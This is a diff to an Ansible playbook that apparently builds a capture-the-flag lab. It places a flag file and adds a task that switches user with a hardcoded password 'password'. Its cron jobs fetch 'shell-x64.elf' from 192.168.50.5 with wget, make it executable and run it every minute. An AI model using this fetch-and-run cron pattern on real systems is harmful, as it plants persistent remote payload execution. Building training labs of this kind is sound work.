@@ -10,9 +10,13 @@
      - libwine
     update_cache: yes
 
+- name: Change user to server
+  expect:
+   command: "su server"
+   responses:
+    Password: "password"
+
 - name: Place flag
-  become: yes
-  become_user: server
   copy:
     dest: '/home/server/flag.txt'
     owner: 'server'
@@ -25,24 +29,18 @@
     line: '192.168.50.5 client'
 
 - name: Cron job for get malicious file
-  become: yes
-  become_user: server
   cron:
    name: "hack file get"
    minute: "1"
    job: "if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi"
 
 - name: Cron job make malicious file executable
-  become: yes
-  become_user: server
   cron:
    name: "hack file executable"
    minute: "1"
    job: "if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi"
 
 - name: Cron job for run malicious file
-  become: yes
-  become_user: server
   cron:
    name: "hack file run"
    minute: "1"
